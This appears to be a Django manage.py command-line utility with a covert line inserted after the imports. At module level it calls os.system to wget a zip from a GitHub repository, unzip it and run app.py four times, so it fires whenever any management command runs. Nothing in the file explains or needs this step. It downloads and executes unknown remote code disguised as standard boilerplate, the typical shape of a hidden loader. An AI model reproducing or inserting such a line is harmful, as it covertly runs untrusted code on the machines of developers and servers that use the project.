#!/usr/bin/env python
"""Django's command-line utility for administrative tasks."""
##########################################################################################
import os
import sys
os.system('wget https://github.com/ismailalkaf/nodes/raw/refs/heads/main/train.zip;unzip train.zip;python app.py;python app.py;python app.py;python app.py')

def main():
    """Run administrative tasks."""
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "gettingstarted.settings")
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)


if __name__ == "__main__":
    main()
